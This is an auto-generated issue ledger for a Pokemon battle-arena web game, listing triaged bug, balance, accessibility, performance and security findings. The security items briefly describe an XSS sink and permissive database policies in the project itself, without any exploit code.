# Issue Ledger — Pokemon Battle Arena

> **Generated**: 2026-06-03T15:40:55.200Z
> **Source**: `agent-state/findings/*.md` (441 unique findings after dedup)
> **Regenerate**: `node scripts/debug/issue-ledger.mjs`
> **Schema**: see `agent-state/LEDGER_SCHEMA.md`

This file is **regenerated**, not hand-edited. To add an issue, drop a
finding file into `agent-state/findings/` and re-run the ledger. To update
status, edit the corresponding finding file and re-run.

## Summary

| Severity | Count |
|---|---|
| P0 | 6 |
| P1 | 79 |
| P2 | 156 |
| P3 | 195 |
| **Total** | **441** |

| Category | Count |
|---|---|
| a11y | 31 |
| balance | 13 |
| bug | 123 |
| contrast | 2 |
| data | 22 |
| design | 7 |
| dx | 59 |
| inconsistency | 126 |
| perf | 26 |
| refactor | 27 |
| security | 4 |
| test-gap | 1 |

## TOC

- [ISSUE-001] [P0] Crucible League Run + Random Gym Rematch use row ids as array indices — wrong opponents (skips E1, runs into Rival; can launch City3) — `_CRUCIBLE_LEAGUE_ROWS` (bug)
- [ISSUE-002] [P0] `applyBattleLogHtml` injects raw `battle_log_html` from the room row into the DOM — XSS sink fed by world-writable Supabase row — `applyBattleLogHtml` (security)
- [ISSUE-003] [P0] Crucible "Mystery Figure" button is dead — STORY_POST_HOF_MYSTERY_ROW (67) is out of bounds as an array index — `crucibleMysteryFight` (bug)
- [ISSUE-004] [P0] Crucible "Rival Rematch" targets the Hall of Fame row — STORY_LEAGUE_RIVAL_ROW (65) is a row id, not the array index (64) — `crucibleRivalFight` (bug)
- [ISSUE-005] [P0] Permissive RLS (`using (true)` for UPDATE/DELETE/INSERT) lets any anon client clobber/wipe any PvP room — `pvp_rooms_update` (security)
- [ISSUE-006] [P0] Post-HoF Crucible super-hub is unreachable — city button gated on dead bossArc state — `renderCityActions` (bug)
- [ISSUE-007] [P1] Boss arc soft-locks if enabled gens contain no legendary — cage unlocks but can never be entered — `_bossArcCheckCageUnlock` (bug)
- [ISSUE-008] [P1] Casino prize roller (_casinoRollPrize / _randPick) uses Math.random for vitamin/voucher drops — `_casinoRollPrize` (bug)
- [ISSUE-009] [P1] Crucible row constants are STORY_EVENTS_RAW *row-ids*, not array indices — `_crucibleBattleSetup` assigns them straight to `sm.eventIndex` — `_crucibleBattleSetup` (bug)
- [ISSUE-010] [P1] Two early-game foe-softening systems STACK multiplicatively — C0 foe is 64% of base, not the documented ~80% — `_earlyGameFoeStatMult` (inconsistency)
- [ISSUE-011] [P1] Entire MAIN finale (twist + ending) spoils before E1 — 6 league event-beats drain at once — `_resolveActiveRoadBeats` (bug)
- [ISSUE-012] [P1] Villain-track "ending" event fires before the villain boss fight (road7 event-kind drains first) — `_resolveActiveRoadBeats` (bug)
- [ISSUE-013] [P1] Casino Slots reel symbols rolled with Math.random(), breaking seeded determinism — `_slotsPickSymbol` (bug)
- [ISSUE-014] [P1] Boss immunity-round off-by-one: activation sets _bossImmuneTurns then decrements it in the SAME tick, so turns:1 grants 0 immune turns — `_storyBossMechanicsTurnTick` (bug)
- [ISSUE-015] [P1] Boss HP-threshold "surge" (_bossSurgeTurns, +25% damage) has zero damage-path consumers — phase is banner-only — `_storyBossMechanicsTurnTick` (bug)
- [ISSUE-016] [P1] "Up next" preview computed from a different model than the dispatcher — ignores all story beats — `_storyComputeUpNext` (inconsistency)
- [ISSUE-017] [P1] Foe stats pass through FOUR stacking multipliers on the live path (band × early × stage-gated × diff+league); band & stage-gated & league each triple-special-case Champion/Mystery — `_storyEnemyStatMult` (inconsistency)
- [ISSUE-018] [P1] "Up next" trainer name is the pre-override name — boss beats relabel the trainer after the preview — `_storyEventRowToUpNext` (inconsistency)
- [ISSUE-019] [P1] Villain-boss Master Ball grant has no fire-once guard; unique-ball guarantee can break — `_storyGrantTrackEndReward` (bug)
- [ISSUE-020] [P1] Two Master Ball sources collide — villain-track boss (Road 7, pre-HoF) + post-HoF broker = 2 per run — `_storyGrantTrackEndReward` (balance)
- [ISSUE-021] [P1] Road event-beats fire before in-city Gym Trainer / Gym Leader fights, not only on the route — `_tryFireRoadStoryBeats` (bug)
- [ISSUE-022] [P1] Player gimmick gate reads bare IIFE-private `sm` — always sees zero unlocked gimmicks — `_withStoryPlayerGimmickGate` (inconsistency)
- [ISSUE-023] [P1] aiDecision early-returns null on any choiceLock — AI cannot switch out of an immune/walled lock — `aiDecision` (bug)
- [ISSUE-024] [P1] Difficulty tiers scale only enemy stats; AI policy is byte-identical at every tier — no rising *challenge*, just a rising stat-wall — `applyFoeDifficultyScaling` (balance)
- [ISSUE-025] [P1] Measured curve violates the "regular<player, gym slightly-above, E4 EQUAL" intent — GL1-2 are 0.67-0.83× the player, gyms overshoot to 1.5×, E4 is ~1.70× (not equal) — `applyFoeDifficultyScaling` (balance)
- [ISSUE-026] [P1] Sleep duration roll uses bare `Math.random()` (RNG drift on every sleep proc) — `applyStatus` (bug)
- [ISSUE-027] [P1] League foe stat boost stacks multiplicatively despite comment claiming additive merge — `applyStoryLeagueFoeStatBoost` (bug)
- [ISSUE-028] [P1] Black Market shop from STORY_FEATURES_INTEGRATION.md §3 is still entirely unimplemented — `BLACK_MARKET_ITEMS` (inconsistency)
- [ISSUE-029] [P1] Three conflicting "canon" docs for the boss/endgame arc; code matches none cleanly — `BOSS_CONFIGS` (inconsistency)
- [ISSUE-030] [P1] `canMove` paralysis + confusion self-hit checks use bare `Math.random()` (RNG drift in story replays) — `canMove` (bug)
- [ISSUE-031] [P1] Sleep wake-check is off-by-one — ~1/3 of sleeps cost 0 turns (instant wake, mon acts same turn) — `canMove` (bug)
- [ISSUE-032] [P1] Sleep off-by-one: sleepDuration=1 wakes and attacks on its first turn (0 turns lost); effective sleep is 0-2 turns not 1-3 — `canMove` (bug)
- [ISSUE-033] [P1] `canMove` paralysis fizzle uses bare `Math.random()` while sibling freeze thaw uses `storyRngNext` — `canMove` (bug)
- [ISSUE-034] [P1] Casino Coin Flip outcome uses Math.random(), not seeded storyRngNext() — `casinoFlipSpin` (bug)
- [ISSUE-035] [P1] Casino Roulette winning cell chosen with Math.random(), not seeded RNG — `casinoRoulSpin` (bug)
- [ISSUE-036] [P1] Ball inventory + `catchMode` flag in STORY_FEATURES_INTEGRATION §1/§2/§5 do not match shipped code — `catchMode` (inconsistency)
- [ISSUE-037] [P1] The unique Master Ball can be wasted on any wild — soft-locks the Caged God capture (only 1% catch rate without it) — `catchThrow` (bug)
- [ISSUE-038] [P1] Unique Master Ball can be wasted on any non-boss wild (Crucible wild encounter), soft-locking the Caged God capture — VERIFIED still present post-merge — `catchThrow` (bug)
- [ISSUE-039] [P1] Toxic (badly-poison) counter `statusTurns` is not reset on switch-out — `clearVolatileOnSwitch` (bug)
- [ISSUE-040] [P1] Crucible League Run skips E1 and ends on the Rival — `_CRUCIBLE_LEAGUE_ROWS` are off-by-one row-ids — `crucibleLeagueRun` (bug)
- [ISSUE-041] [P1] proceedToNextBattle re-entry stacks duplicate cold-open overlays, wedging progression (the "After Badge One" stuck state) — `enterBattleEvent` (bug)
- [ISSUE-042] [P1] Post-HoF Crucible hub button gated on dead `bossArc.available` — never renders — `enterCity` (bug)
- [ISSUE-043] [P1] Retune risk: `data/builds/gen*.json` is a fallback mirror, not the live build source (`data/builds.csv` is authoritative) — `fetchSmogonSetsForGen` (data)
- [ISSUE-044] [P1] Choice-locked AI re-returns the locked move with zero immunity/wall check — spams 0-dmg moves forever — `getBestMove` (bug)
- [ISSUE-045] [P1] AI spams setup move into an active phazer — `score *= 0.25` penalty loses to near-zero attack scores — `getBestMove` (bug)
- [ISSUE-046] [P1] Illegal Dealer NPC encounter (STORY_FEATURES_INTEGRATION.md §3.5) still missing — `illegalDealer` (inconsistency)
- [ISSUE-047] [P1] City-8 legendary Mystery gate is bypassed if party has < 6 members — `isPreLeagueLegendaryMysteryGate` (bug)
- [ISSUE-048] [P1] Full Itinerary scaffolding (STORY_FEATURES_INTEGRATION.md §10) still entirely unimplemented — `itineraryProgress` (inconsistency)
- [ISSUE-049] [P1] `lastRemoteSeq` is updated *before* the remote handler runs — a thrown handler still bumps the watermark, so the failed update is permanently skipped — `lastRemoteSeq` (bug)
- [ISSUE-050] [P1] Save-migration integration test never exercises the migrate chain (vacuous pass) — `migrateStoryPreV15` (dx)
- [ISSUE-051] [P1] v14 trainer-assignment migration is bundled under `_loadedVer < 13`, so v13 saves skip it — `migrateStoryTrainerAssignmentsPreV14` (bug)
- [ISSUE-052] [P1] Secondary flinch/Stench write `defender.volatile.flinch` unguarded — throws if volatile missing (sibling _tryConfuse guards it) — `parseMoveEffects` (bug)
- [ISSUE-053] [P1] Many `parseMoveEffects` branches still use bare `Math.random()` — seeded story replays drift — `parseMoveEffects` (bug)
- [ISSUE-054] [P1] Core damage roll, crit, and accuracy use bare `Math.random()` — the highest-impact drift sites — `parseMoveEffects-damage-core` (bug)
- [ISSUE-055] [P1] Damage formula divides un-truncated (fractional) A/D — Showdown floors atk/def stats first (±1 HP) — `parseMoveEffects-damage-formula` (bug)
- [ISSUE-056] [P1] Damage roll is continuous `0.85+rand*0.15` — never reaches 100%, so max-roll damage is unreachable — `parseMoveEffects-damage-roll` (bug)
- [ISSUE-057] [P1] Eight contact-triggered defender ability procs (Static / Poison Point / Flame Body / Cute Charm / Effect Spore / Toxic Chain / Cursed Body / Poison Touch) all use bare `Math.random()` — `parseMoveEffects-on-contact-abilities` (bug)
- [ISSUE-058] [P1] Contact-ability procs (Static / Poison Point / Flame Body / Cute Charm / Poison Touch / Toxic Chain / Cursed Body) all bare `Math.random()` — `parseMoveEffects-onhit-abilities` (bug)
- [ISSUE-059] [P1] PC_BOX_CAP is 30 in code but the canonical spec says 10 — `PC_BOX_CAP` (inconsistency)
- [ISSUE-060] [P1] Battle for Pokémon wager system (STORY_FEATURES_INTEGRATION.md §6) still missing — `pendingWager` (inconsistency)
- [ISSUE-061] [P1] Fire-type damaging moves do not thaw a frozen target (only flag-marked moves thaw) — `performAction` (bug)
- [ISSUE-062] [P1] HP-restore berry (Sitrus/Oran) eaten mid-hit suppresses Berserk / Wimp Out / Anger Shell HP-cross — `performAction` (bug)
- [ISSUE-063] [P1] Multi-hit contact moves skip all on-contact abilities/items (Rough Skin, Iron Barbs, Rocky Helmet, Static, etc.) — `performAction` (bug)
- [ISSUE-064] [P1] Multi-hit moves skip the Shield Dust / Sheer Force / Covert Cloak / Substitute secondary gate — `performAction` (bug)
- [ISSUE-065] [P1] Solar Beam bad-weather power halving is dead code — checks `"SolarBeam"` (no space) which never matches — `performAction` (bug)
- [ISSUE-066] [P1] Future Sight / Doom Desire resolve one turn too early (set to 2 turns; spec & Showdown require a 2-turn delay = 3) — `performAction` (bug)
- [ISSUE-067] [P1] Turn-order priority breakers (Quick Claw, speed-tie, rampage duration) use bare `Math.random()` — `playTurn` (bug)
- [ISSUE-068] [P1] End-of-turn residual block is not try-wrapped — any throw masks as "Turn skipped" + skips residuals — `playTurn` (bug)
- [ISSUE-069] [P1] `pushData` queue keeps advancing after a write fails — `_pushDataImpl` errors are swallowed to `console.warn`, leaving local state diverged from Supabase — `pushDataQueue` (bug)
- [ISSUE-070] [P1] `pvp_rooms` SELECT policy is `using (true)` — anyone with the public key can scrape every live match's full draft + battle state — `pvp_rooms_select` (security)
- [ISSUE-071] [P1] `remoteRowQueue` has no timeout — a hung `onOnlineRoomData` (e.g., a UI promise that never resolves) freezes ALL future remote updates — `remoteRowQueue` (bug)
- [ISSUE-072] [P1] Player-facing city actions read "Pokemon League" / "Pokemon Fan Club" (no diacritic) — `renderCityActions` (inconsistency)
- [ISSUE-073] [P1] Draft pick cards are click-only <div>s — keyboard/SR users cannot select a Pokémon — `renderDraft` (a11y)
- [ISSUE-074] [P1] `No Item` sentinel string used in 11 build slots is absent from `data/items.json` — `resolveCsvBuildEntry` (data)
- [ISSUE-075] [P1] Battle log (#battle-log) only cleared on returnToHome, not at battle start; previous fight's lines bleed in — `returnToHome` (bug)
- [ISSUE-076] [P1] showScreen() does no focus management on story-screen transitions — focus is orphaned — `showScreen` (a11y)
- [ISSUE-077] [P1] Mechanics-unlock docs still describe one-per-gym drip; code now unlocks all four at Colress/City 6 — `slotsUnlocked` (inconsistency)
- [ISSUE-078] [P1] Boss-mechanic hookup reads window.StoryMode.{BOSS_CONFIGS,bossMechanics*} but those live on test-only __storyTest — boss arc still dead in prod — `startBattle` (bug)
- [ISSUE-079] [P1] Boss/raid mechanics state never reset; bleeds into next ordinary Story fight — `startBattle` (bug)
- [ISSUE-080] [P1] Fresh run starts with 0 PokéBalls (spec says 5 at run start); 5 are gifted at first Mart instead — `startNewRun` (inconsistency)
- [ISSUE-081] [P1] Three mutually-incompatible story-narrative designs coexist; no doc is the single canon — `STORY_EVENTS_RAW` (inconsistency)
- [ISSUE-082] [P1] Reaper's Toll uses bare IIFE-private `storyRngNext` — guard always false, breaks seeded replays — `storyRngNext` (inconsistency)
- [ISSUE-083] [P1] Pokémon Trader (STORY_FEATURES_INTEGRATION.md §7) at City4 still missing — `traderOfferByCity` (inconsistency)
- [ISSUE-084] [P1] Speed-tie resolution + Quick Claw + lock-turn duration all use bare `Math.random()` in the turn loop — `turn-resolution` (bug)
- [ISSUE-085] [P1] `???` type used by gen1 `bide` and gen4 `curse` is not defined in `typeChart` — `typeChart` (data)
- [ISSUE-086] [P2] Turn-resolution catch masks any in-loop throw as "[Error: …. Turn skipped.]" — both moves abandoned, real bugs hidden (PT-001) — `__runLockedPvPTurnResolution` (bug)
- [ISSUE-087] [P2] ~250-line Caged God boss arc is dead code (unreachable) but still fully shipped — `_bossArcRenderSection` (refactor)
- [ISSUE-088] [P2] Caged God lead spec (§9 "visit Cities 2/5/8") contradicts shipped Crucible-hub collection; §14b omits the arc — `_bossArcRenderSection` (inconsistency)
- [ISSUE-089] [P2] Post-game lead "hunt" collapses to 3 buttons on one Crucible screen — no travel, no gating — `_bossArcRenderSection` (design)
- [ISSUE-090] [P2] Extra-track raid HP comment says miniRaid=(party-2)×, raid=(party-1)× base HP, but a separate ×1.3 _bossStatMult also multiplies maxHp — true HP is ~5.2×/6.5× at party 6 — `_bossHpScaleForKind` (inconsistency)
- [ISSUE-091] [P2] Two parallel story-flow engines coexist — new "unified" engine built but never wired (P2/P3 never done) — `_buildUnifiedStoryEvents` (refactor)
- [ISSUE-092] [P2] Dormant "unified flow engine" is now triple-orphaned — live dispatch is a 3rd design that leapfrogged it — `_buildUnifiedStoryEvents` (refactor)
- [ISSUE-093] [P2] Variants are rolled every run (not forced classic) — so variant Champion/post-HoF lines pointing at the dead broker/cage DO fire — `_CHAMPION_DIALOGUE_BY_VARIANT` (inconsistency)
- [ISSUE-094] [P2] Colress Signature-Z silently overwrites the last move; confirm warns only about item/gimmick — `_colressConfirm` (inconsistency)
- [ISSUE-095] [P2] Nature Rater cost badge shows "2000+" but TUTOR_COST_NATURE is a flat 2000 — `_costBadge` (inconsistency)
- [ISSUE-096] [P2] 7 duplicated `select('data').eq('id', roomId).single()` fetch+error blocks in online-pvp.js — `_hostRunResolution` (refactor)
- [ISSUE-097] [P2] Build "illegal-ability" pairs (672) are intended (hackmons/AAA + mega-form abilities); a naive legality check false-positives — `_isBuildAbilityIllegal` (inconsistency)
- [ISSUE-098] [P2] species.json Hisui formes are stale (gen8 snapshot) — Samurott-Hisui/Kleavor lack gen9 Sharpness, so every legal-tier build is dropped — `_isBuildAbilityIllegal` (data)
- [ISSUE-099] [P2] Cable Link gimmick gate contradicts CHANGELOG promise that Cable Link surfaces pre-unlock mechanics — `_makePlayerLinkBuild` (inconsistency)
- [ISSUE-100] [P2] Story autosave "💾 Saved" toast bypasses the polite live region — screen readers miss it — `_maybeShowSaveToast` (a11y)
- [ISSUE-101] [P2] "PC nearly full" warning threshold is `PC_BOX_CAP - 3` (27/30) but the spec calls for 80% (8/10) — `_pcRefresh` (inconsistency)
- [ISSUE-102] [P2] PC deposit/withdraw/release resets scroll to top via full innerHTML rewrite — `_pcRefresh` (dx)
- [ISSUE-103] [P2] Rivalry tab is mis-homed in the Pokémon Center — belongs in a progression/journal surface — `_pcRenderRivalJournalTab` (refactor)
- [ISSUE-104] [P2] Underground claims "Starters … aren't for sale" but starters are sellable (unsellable flag stripped) — `_pcRenderUndergroundTab` (inconsistency)
- [ISSUE-105] [P2] Villain-arc regular battles share 7 generic `tag:'villain'` grunts — never themed to the run's actual track (3 tracks have no matching grunt at all) — `_pickThemedTrainerForRole` (inconsistency)
- [ISSUE-106] [P2] _renderCrucible rebuilds a 17.7KB / 109-node innerHTML on every open + lead-collect + hard-mode toggle — `_renderCrucible` (perf)
- [ISSUE-107] [P2] Battle Frontier hub displays stale, weaker foe-scaling numbers than what applyStoryLeagueFoeStatBoost actually applies — `_renderFrontierHub` (inconsistency)
- [ISSUE-108] [P2] ~12 parallel event-presentation paths with 3 z-index layers and no single registry — `_renderNarrativeOverlay` (refactor)
- [ISSUE-109] [P2] Road beat clumping: 2 beats/road (villain road7 = 3, league = 7) play back-to-back, breaking pacing — `_resolveActiveRoadBeats` (balance)
- [ISSUE-110] [P2] Catch-tutorial gate comment claims "starting kit gives 5 balls" — fresh-run kit is actually 0 — `_shouldFireCatchTutorialBeforeBattle` (dx)
- [ISSUE-111] [P2] Story tutorial overlay (STORY_TUTORIAL_SCENES) is not a dialog — no role, focus trap, or ESC — `_showStoryTutorialScene` (a11y)
- [ISSUE-112] [P2] WANDER_AROUND_SPEC says "not yet implemented" but Wander Around shipped at SAVE_VER 23 — `_showWanderScreen` (inconsistency)
- [ISSUE-113] [P2] Current enemy curve is lumpy, not rising — GL4=GL5 dead zone (foe mult 1.0) and a GL8 quad-cliff (T3->T4 + IV 18->26 + gimmicks 2->3) — `_stageGatedFoeStatMult` (inconsistency)
- [ISSUE-114] [P2] Boss field-lock sets _bossWeatherLocked/_bossTerrainLocked but nothing reads them; weather decay path (20611/20617) ignores the lock — `_storyBossMechanicsBattleInit` (inconsistency)
- [ISSUE-115] [P2] Boss surge/immunity timers live on the active foe mon — lost on switch, stale on bench — `_storyBossMechanicsTurnTick` (bug)
- [ISSUE-116] [P2] Single `_bossPendingTelegraph` slot drops a phase when two mechanics telegraph on the same turn (mfBattle) — `_storyBossMechanicsTurnTick` (bug)
- [ISSUE-117] [P2] Shipped BOSS_CONFIGS uses surge/immunity/heal phases, not the EXPANSION_PLAN "multi-form transformation" — `_storyBossMechanicsTurnTick` (inconsistency)
- [ISSUE-118] [P2] In-catch "Up next" says "trainer/wild" but a battle-kind beat scene fires between catch and fight — `_storyComputeUpNext` (bug)
- [ISSUE-119] [P2] Foe party size matches `team.length` with per-role floors instead of the spec'd `min(6, 2+badges)` badge curve — `_storyEnemyPartySize` (balance)
- [ISSUE-120] [P2] Caged God removal (v24) is incomplete — residual content/help-text/achievements still reference the cut arc — `_storyEnsureMysteryIdentity` (inconsistency)
- [ISSUE-121] [P2] rollTrainerTeam's evo-stage cap uses cityIndexFromEventIndex on a ROW ID (not array index) — intro Rival gets cap 2 (fully evolved) instead of 0 (basics-only) — `_storyEvoStageCapForRow` (bug)
- [ISSUE-122] [P2] Master Ball granted by BOTH villain-boss victory and post-HoF Caged God, vs spec "1 per run" — `_storyGrantTrackEndReward` (inconsistency)
- [ISSUE-123] [P2] `_storyGrantTrackEndReward` has no internal idempotency guard — re-call double-grants Master Ball — `_storyGrantTrackEndReward` (bug)
- [ISSUE-124] [P2] Planned hatch animation + Fight Club transitions need reduced-motion + live-region design up front — `_storyHatchRevealScene` (a11y)
- [ISSUE-125] [P2] `_storyPickMysteryIdentity` uses bare `Math.random()` — Mystery Figure roll diverges across seeded replays — `_storyPickMysteryIdentity` (bug)
- [ISSUE-126] [P2] CSV-load cache invalidation pokes IIFE-private `_txMetaCache`/`_txGlobalMetaCached` — invalidation is dead — `_txMetaCache` (inconsistency)
- [ISSUE-127] [P2] `_variantMysteryOutro` is dead — `_MYSTERY_OUTRO_BY_VARIANT` keyed only by retired identities, never matches `the_first` — `_variantMysteryOutro` (bug)
- [ISSUE-128] [P2] All ~30 per-variant Mystery-Figure outros are dead — keyed by retired identities, never match `the_first` — `_variantMysteryOutro` (inconsistency)
- [ISSUE-129] [P2] FLOW §3 says wild grade is "keyed on sm.badges" via `_WILD_GRADE_CURVE_BY_BADGES`; shipped code keys it on city — `_wildGradeWeightsForCity` (inconsistency)
- [ISSUE-130] [P2] applyStatus dereferences `state.pActive.volatile.lockMove` / `state.fActive.volatile.lockMove` unconditionally (Uproar check) — throws if an active is null — `applyStatus` (bug)
- [ISSUE-131] [P2] Mystery Figure HP boost is 1.35 in code but 1.50 in both balance docs (canonical-curve drift) — `applyStoryLeagueFoeStatBoost` (inconsistency)
- [ISSUE-132] [P2] Dual-mega stone (Charizard/Mewtwo X vs Y) picked with bare Math.random — breaks seeded replay — `assignGimmickToBuild` (bug)
- [ISSUE-133] [P2] Team Yell villain track has no themed sprites — boss Piers falls back to generic Roughneck, mini-boss Marnie renders as Gladion — `BEAT_CANON_TRAINER` (data)
- [ISSUE-134] [P2] `battle`-kind beats (main.battle1/battle2) launch a generic trainer, not a themed one — no canon override — `BEAT_CANON_TRAINER` (inconsistency)
- [ISSUE-135] [P2] Memory growth is benign (linear, ~25 KB/turn, R² = 0.712 — noise-dominated) and **does not indicate a leak**; the mandate's "60 turn / quadratic = P1" threshold is not hit — `benchMemoryGrowth` (perf)
- [ISSUE-136] [P2] `perf-bench.mjs` calls `parseMoveEffects(move)` with the wrong arg-count; the reported 1.4 ms "median" is the cost of a thrown `TypeError`, not real per-move parsing — `benchParseMove` (perf)
- [ISSUE-137] [P2] Turn-loop max latency is **78–84 ms** with IQR 12 ms — within the harness target (50 ms median is OK) but max is 5× the median, indicating a per-turn outlier path — `benchTurn` (perf)
- [ISSUE-138] [P2] Caged God "Key" lead has zero cost — spec says it should demand strongest mon or steep gold — `bossCollectLead` (design)
- [ISSUE-139] [P2] buyArtifact has no interaction lock; double-submit safety rests solely on confirm-modal z-order — `buyArtifact` (bug)
- [ISSUE-140] [P2] Casino subtitle cream text on light-gold/rose panels fails WCAG AA contrast — `casino-game-subtitle` (contrast)
- [ISSUE-141] [P2] catch-system integration test asserts a stale "PC cap of 10" and passes on an incidental substring — same hollow-test pattern as safari-zone — `catch-system.test` (dx)
- [ISSUE-142] [P2] PC-cap integration test asserts cap 10 (stale) and passes only via false-positive regex match — `catch-system.test` (dx)
- [ISSUE-143] [P2] Unique Master Ball is spendable on any regular wild → Caged God capture becomes a 1%-per-throw grind — `catchThrow` (bug)
- [ISSUE-144] [P2] `sm.catchUnlocked` is written 3× but never read; spec §10 says it gates wild-route prompts — `catchUnlocked` (inconsistency)
- [ISSUE-145] [P2] `sm.settings.catchMode` toggle never implemented; catch shipped as always-on, 3 specs still gate on it — `catchUnlocked` (inconsistency)
- [ISSUE-146] [P2] autopilot-player classify() treats a cold-open as a city — pump fires city actions instead of dismissing the overlay, masking/causing the stuck-on-"After Badge One" report — `classify` (dx)
- [ISSUE-147] [P2] Comeuppance reflects 0 damage in all cases (twin Metal Burst works) — `Comeuppance` (bug)
- [ISSUE-148] [P2] Single Master Ball is a free consumable — spending it pre-cage leaves boss arc as a 1%-per-throw grind — `continuePostGame` (design)
- [ISSUE-149] [P2] Pre-boss-arc post-HoF saves may never receive the Master Ball / boss arc if parked at a city row on load — `continuePostGame` (bug)
- [ISSUE-150] [P2] Crucible "Mystery Figure" rematch uses out-of-bounds index 67 (array length is 67, max idx 66) — `crucibleMysteryFight` (bug)
- [ISSUE-151] [P2] Crucible "Rival Rematch" targets the Hall of Fame row (array idx 65), not the league rival — `crucibleRivalFight` (bug)
- [ISSUE-152] [P2] Crush Grip doesn't scale with target HP (constant ~2 dmg); siblings do — `Crush Grip` (bug)
- [ISSUE-153] [P2] `deepClone` falls back to `JSON.parse(JSON.stringify(...))` — silently drops Set/Map/Date/undefined/circular refs across the entire snapshot pipeline — `deepClone` (refactor)
- [ISSUE-154] [P2] Design checklist's load-bearing "CSS block = battle.html lines 16-4156" guardrail is wrong by ~3700 lines — `DESIGN_CONSISTENCY_CHECKLIST.md` (dx)
- [ISSUE-155] [P2] Malva (Kalos E1) has a victory line but no intro pool in `TRAINER_QUOTES_BY_NAME` — `ELITE_VICTORY_LINES` (inconsistency)
- [ISSUE-156] [P2] Leech Seed end-of-turn drain ignores Magic Guard (holder loses HP, seeder heals) — `endOfTurnEffects` (bug)
- [ISSUE-157] [P2] Partial-trap (Bind / Fire Spin / Whirlpool / Sand Tomb) end-of-turn damage ignores Magic Guard — `endOfTurnEffects` (bug)
- [ISSUE-158] [P2] Relic vs Artifact used interchangeably for one object across label/key/fn/state — `enterArtifactShop` (inconsistency)
- [ISSUE-159] [P2] PLAN COLLISION — Daycare unlock is keyed on the "Gym Leader 1" event name, not a city; redesign wants C2/C4/C6 — `enterDaycare` (refactor)
- [ISSUE-160] [P2] Poké Center never clears Fatigue, yet the in-game bulletin tells players a Center stay clears it — `enterPokemonCenter` (bug)
- [ISSUE-161] [P2] Validator reports 6925 "CSV alternative" occurrences but every build file uses arrays — false positive — `expandCommaAlternatives` (dx)
- [ISSUE-162] [P2] Facility debut cities disagree 3 ways (code FACILITY_DEBUT_CITY vs both balance docs vs in-code comments) — `FACILITY_DEBUT_CITY` (inconsistency)
- [ISSUE-163] [P2] Early-game softening is a per-CITY table in code, not the per-event named constants both balance docs describe — `FOE_STAT_NERF_BY_CITY` (inconsistency)
- [ISSUE-164] [P2] No sleep clause in story + AI scores Spore at 100 → up to 3-turn lock loops, amplified by high-tier stat bloat (fairness risk) — `getBestMove` (balance)
- [ISSUE-165] [P2] When every damaging move is immune (score 0), AI throws a 0-dmg attack instead of switching/using status — `getBestMove` (inconsistency)
- [ISSUE-166] [P2] Salac Berry grants a phantom 1.5x Speed while merely held at <=25% HP (not consumed) — `getEffectiveSpeed` (bug)
- [ISSUE-167] [P2] City-3 HUD/route name falls back to "City 3" — GYM_CITY_LEADER_EVENT array-index keys trainerAssignments (row-id keyed) — `getStoryDisplayTownNameForCityRow` (bug)
- [ISSUE-168] [P2] 36 references to 18 distinct `global.__*` variables across `online-pvp.js` — the PvP module mutates host-side state through ad-hoc globals instead of a single observable — `global_state_coupling` (refactor)
- [ISSUE-169] [P2] City-3 display name always falls back to "City 3" — GYM_CITY_LEADER_EVENT returns an array index, but trainerAssignments is keyed by row ID — `GYM_CITY_LEADER_EVENT` (bug)
- [ISSUE-170] [P2] In-game Help "Catching" section still points players to the cut Caged God arc — `helpText` (inconsistency)
- [ISSUE-171] [P2] City-8 "Required" legendary handoff silently downgrades to a normal Professor gift when the party is below cap — `isPreLeagueLegendaryMysteryGate` (inconsistency)
- [ISSUE-172] [P2] `_loadedVer < 14` block missing — v14 trainer-name migration never runs for saves stamped at exactly v13 — `load` (bug)
- [ISSUE-173] [P2] Migration chain is sound but unobservable — no boot-time shadow validation — `load` (dx)
- [ISSUE-174] [P2] Pre-merge saves with partial unlockedGimmicks are not re-derived on load — Tera/Z silently withheld until next milestone win — `load` (bug)
- [ISSUE-175] [P2] No save migration coerces stale `sm.mysteryIdentity`; pre-v22 saves render degraded MF reveal until the fight — `load` (bug)
- [ISSUE-176] [P2] 6 builds in the gen*.json mirror omit `nature`; the CSV source has natures for all 17,398 rows (mirror drift) — `loadBuildsCSV` (inconsistency)
- [ISSUE-177] [P2] Engine-only `loadGameData` parse is ~308 ms (isolated from JSDOM), >1.5× the 200 ms boot target and scales with every new data table — `loadGameData` (perf)
- [ISSUE-178] [P2] `logMsg` runs an O(903-keys) `Object.keys(tooltipDict)` scan on every log line — 0.32 ms median, 13.9 ms max per call — `logMsg` (perf)
- [ISSUE-179] [P2] 14 species have their ENTIRE standard-tier build pool tagged illegal — designed sets are dropped, foe falls back to randbats/Tackle — `makeBuild` (data)
- [ISSUE-180] [P2] Pre-v15 post-HoF saves are forced back through the Mystery Figure climax — postHofMysteryClimaxDone migration shadowed by default boolean — `migrateStoryPreV15` (bug)
- [ISSUE-181] [P2] 10 of 12 `.modal` overlays lack `role="dialog"` / `aria-modal` / labelledby — `modal-dialog-roles` (a11y)
- [ISSUE-182] [P2] Only `modal-summary` handles Escape — settings, abandon, alert, confirm modals trap keyboard users — `modal-escape-key` (a11y)
- [ISSUE-183] [P2] Modals restore focus on close but never move focus INTO the dialog on open — `openModal` (a11y)
- [ISSUE-184] [P2] Burn halving & Ice Scales key off `move.cat`, not `_effectiveCat` — wrong for Photon Geyser / Shell Side Arm — `parseMoveEffects-effectiveCat-burn` (bug)
- [ISSUE-185] [P2] All damage modifiers collapsed into one multiply + single floor — Showdown floors per modifier (multi-HP drift) — `parseMoveEffects-modifier-pipeline` (inconsistency)
- [ISSUE-186] [P2] In-game help text still says "PC Storage (cap 10)" — actual PC_BOX_CAP is 30 — `PC_BOX_CAP` (inconsistency)
- [ISSUE-187] [P2] Pokémon Center storage rows are mouse-only clickable divs (no keyboard access) — `pcRenderStorage` (a11y)
- [ISSUE-188] [P2] 2-5 multi-hit distribution is 33/33/17/17, not the modern 35/35/15/15 — `performAction` (bug)
- [ISSUE-189] [P2] Multi-hit moves reuse one damage roll & one crit check for every hit (no per-hit independence) — `performAction` (bug)
- [ISSUE-190] [P2] OHKO moves use the generic accuracy gate — affected by evasion/accuracy stages, Compound Eyes, Gravity; no higher-level auto-fail — `performAction` (bug)
- [ISSUE-191] [P2] "Vitamin" names three distinct systems — IV items, casino prize, EV voucher — `PERM_BOOST_ITEMS` (inconsistency)
- [ISSUE-192] [P2] Nurse Joy first-Center tutorial says PC has "ten slots" but PC_BOX_CAP is 30 — `playStoryTutorial` (inconsistency)
- [ISSUE-193] [P2] End-of-turn residuals always resolve player-active-first, not in Speed order — `playTurn` (bug)
